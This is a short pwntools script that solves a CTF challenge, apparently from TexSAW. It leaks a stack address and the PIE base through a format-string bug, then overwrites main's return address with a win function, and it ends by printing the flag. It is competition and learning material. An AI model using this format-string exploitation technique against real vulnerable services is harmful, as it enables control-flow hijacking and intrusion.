from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./vuln', '''
    b *(main+115)
    b *(main+154)
    continue
''')

# p = remote('74.207.229.59', 20221)

# 1. leak current rsp value and elf base address with fmtstr
p.sendlineafter(b"Haha my buffer cant be overflowed and there is pie, ill even let you read and print twice\n", b'%9$p%27$p')
leaks = p.recvline().strip().decode()
current_rsp_val = int(leaks[0:14], 16)-0x48
log.info(f"current rsp value: {hex(current_rsp_val)}")
elf_base_addr = int(leaks[14:], 16)-0x11b3
log.info(f"elf base address: {hex(elf_base_addr)}")

# 2. write win usable address to main return address with fmtstr
main_return_addr = current_rsp_val+0x88
win_usable_addr = elf_base_addr+0x118d
context.bits = 64
p.sendline(fmtstr_payload(6, {main_return_addr: win_usable_addr}))

p.interactive()

# texsaw{Pr1nt1ng_tHe_Fs_15_e4sy}